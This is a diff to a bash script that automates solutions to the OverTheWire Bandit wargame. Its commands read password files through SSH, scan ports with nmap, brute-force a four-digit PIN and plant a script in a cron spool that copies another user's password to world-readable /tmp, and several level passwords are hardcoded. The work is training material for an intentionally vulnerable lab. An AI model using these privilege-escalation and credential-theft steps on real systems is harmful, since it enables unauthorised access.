@@ -1,11 +1,12 @@
 #!/bin/bash
+# shellcheck disable=SC2016 # things don't expand in single quotes, but that is what we want here.
 set -uo pipefail
+# shellcheck disable=SC2154 # $s is defined at the start but shellcheck seems to get confused here.
 trap 's=$?; echo "$0: Error on line "$LINENO": $BASH_COMMAND"; exit $s' ERR
 IFS=$'\n\t'
 CSD=$(dirname "$(readlink -f "$0")")
+# shellcheck source=lib/functions.sh
 source "$CSD/lib/functions.sh"
-
-LEVELS=$CSD/levels
 
 echo -n "bandit0" > out/level0
 echo "Level0: $(cat out/level0)"
@@ -26,16 +27,19 @@ run_level 13 "xxd -r data.txt | gzip -d | bzip2 -d | gzip -d | tar -xO data5.bin
 run_level 14 "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i sshkey.private bandit14@localhost cat /etc/bandit_pass/bandit14 2> >(grep -v 'Could not create directory\|Warning: Permanently added\|This is a OverTheWire game server.')"
 run_level 15 "echo '$(cat out/level14)' | nc localhost 30000 | grep -v 'Correct!'"
 run_level 16 "(echo '$(cat out/level15)'; sleep 0.1) | ncat -C --ssl 127.0.0.1 30001 | grep -v 'Correct!'"
-run_level 17 "nmap -oG - -q -p 31000-32000 localhost | grep "Ports: " | sed 's~.*Ports: \|/open/tcp/////\tIgnored State:.*~~g' | sed 's~/open/tcp/////, ~\n~g' | while read port; do (echo \"$(cat out/level16)\"; sleep 0.1) | ncat -C --ssl 127.0.0.1 \$port 2>/dev/null; done | grep -v 'Correct!\|$(cat out/level16)'"
-run_level 18 "diff --changed-group-format='%>' --unchanged-group-format='' passwords.old passwords.new"
+run_level 17 "nmap -oG - -q -p 31000-32000 localhost | awk '-F\t' '/Ports: / { print \$2 }' | awk '-F ' '{print \$2\"\n\"\$3}' | awk '-F/' '{print \$1}' | while read port; do (echo \"$(cat out/level16)\"; sleep 0.1) | ncat -C --ssl 127.0.0.1 \$port 2>/dev/null; done | grep -v 'Correct!\|$(cat out/level16)'"
+run_level 18 "diff --changed-group-format='%>' --unchanged-group-format='' passwords.old passwords.new || true"
 run_level 19 "cat readme"
 run_level 20 "./bandit20-do cat /etc/bandit_pass/bandit20"
-run_level 21 "echo '$(cat out/level20)' | nc -l 4000 & sleep 0.5; ./suconnect 4000 >/dev/null"
+run_level 21 "echo '$(cat out/level20)' | nc -l -p 4000 & sleep 0.5; ./suconnect 4000 >/dev/null"
 run_level 22 "cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv"
 run_level 23 "cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)"
-run_level 24 "echo 'cp /etc/bandit_pass/bandit24 /tmp/bandit24_pass' > /var/spool/bandit24/hacks.sh && while [[ ! -f /tmp/bandit24_pass ]]; do date; ls /var/spool/bandit24/hacks.sh; cat /tmp/bandit24_pass; sleep 1; done && cat /tmp/bandit24_pass"
-run_level 25 "echo 'a a' | nc localhost 30002 &>/dev/null; for x in {0..9999}; do echo \"$(cat out/level24) \${x}\"; done | nc localhost 30002 | grep -A1 'Correct!' | head -2 | tail -1 | sed 's/The password of user bandit25 is //'"
+run_level 24 "install -dm 0777 /tmp/FDcz/ && echo 'cp /etc/bandit_pass/bandit24 /tmp/FDcz/bandit24_pass; chmod 0777 -R /tmp/FDcz/bandit24_pass' > /var/spool/bandit24/hacks_FDcz.sh && chmod +x /var/spool/bandit24/hacks_FDcz.sh && while [[ ! -f /tmp/FDcz/bandit24_pass ]]; do sleep 1; done && cat /tmp/FDcz/bandit24_pass"
+run_level 25 "for x in {0..9999}; do echo \"$(cat out/level24) \${x}\"; done | nc localhost 30002 | grep -A1 'Correct!' | head -2 | tail -1 | sed 's/The password of user bandit25 is //'"
 # Needed to login to bandit25, shrink the terminal so more did not exit, launch vim with v and then open the passwd file - no clue how to automate that
 #bandit_ssh 26 "cat /etc/passwd"
-echo -n "5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z" > out/level26
-#bandit_ssh 27 "ls -la"
+#echo -n "5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z" > out/level26
+run_level 26 "cat bandit26.sshkey"
+echo -n "3ba3118a22e93127a4ed485be72ef5ea" > out/level27
+echo -n "0ef186ac70e04ea33b4c1853d2526fa2" > out/level28
+bandit_ssh 29
